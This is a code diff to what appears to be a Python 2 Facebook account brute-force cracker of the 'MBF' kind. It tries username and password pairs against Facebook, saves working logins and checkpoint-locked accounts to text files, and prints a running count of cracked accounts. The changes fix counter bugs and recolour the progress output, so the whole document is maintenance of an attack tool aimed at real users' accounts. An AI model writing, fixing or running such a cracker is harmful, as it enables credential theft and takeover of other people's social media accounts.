@@ -19,8 +19,6 @@ dados = []
 gagal = []
 oradadi = []
 threads = []
-cekpo = []
-sukses = []
 
 def mbf():
 
@@ -77,18 +75,18 @@ def mbfcrack():
                 sukses.write(user + " | " + password + "\n")
                 sukses.close()
                 dados.append(h+" [OK] " + pu + user + " | " + a + password)
-                count =+ 1
+                count += 1
             else:
                 if "www.facebook" in jsl["error_msg"]:
                     cekpo = open("cekpoint.txt", "w")
                     cekpo.write(user + " | " + password + "\n")
                     cekpo.close()
-                    gagal.append(m+" [CP] " + pu + user + " | " + m + password)
-                    count =+ 1
+                    gagal.append(m+" [CP] " + d + user + " | " + m + password)
+                    count += 1
                 else:
                     oradadi.append(user)
                     count += 1
-            sys.stdout.write(a+ "\r [$] Crack " + str(count) + " => " + str(len(baris)) + " => LIVE= " + str(len(dados)) + " | CEKPO= " + str(len(gagal)))
+            sys.stdout.write(pu+ "\r [$]" + a + " Crack " + p + str(count) + h + " => " + p + str(len(baris)) + h + " => LIVE= " + str(len(dados)) + pu + " | " + k + "CEKPO= " + str(len(gagal)))
             sys.stdout.flush()
 
     except IOError:
@@ -97,7 +95,7 @@ def mbfcrack():
 
 def hasil_crack():
     print
-
+    print
     for ipal in dados:
         print ipal
         
